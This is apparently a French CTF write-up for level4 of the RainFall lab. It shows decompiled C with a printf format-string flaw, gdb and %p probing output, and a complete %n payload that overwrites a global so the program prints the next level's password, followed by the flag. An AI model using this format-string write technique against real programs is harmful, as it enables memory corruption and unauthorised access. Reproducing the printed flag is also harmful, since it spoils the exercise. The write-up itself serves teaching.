Read also: [./Resources/README.md](./Resources/README.md)

# Source

https://dogbolt.org/?id=b9f0625b-1ccf-4c04-ba81-40bf2a6eb0c0 

```c
void p(char *param_1) {
  printf(param_1);
  return;
}

void n(void) {
  char local_20c[520];
 
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) { // 16 930 116
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main(void) {
  n();
  return;
}
```

Ici c’est quasiment la même chose, c’est un exploit du formatstring de printf, on doit faire en sorte
que la condition soit vraie.

Adresse de m :
```
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x8049810
```

On regarde à quel position est stocké la chaîne d'affichage (premier 0x61 `a`), en regardant l'output
de printf on en déduit que c'est le 12eme caractère.

```
level4@RainFall:~$ echo "aaaaaaaaaaaaaaaaaa%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p" | ./level4
aaaaaaaaaaaaaaaaaa0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x61616161 0x61616161 0x61616161 0x70256161
```

On doit retourner : 16 930 116 - 4 (pour l’adresse) = %16930112x

```
(python -c "print('\x10\x98\x04\x08%16930112x%12\$n')"; cat) | ./level4
```

On obtient le flag !

```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
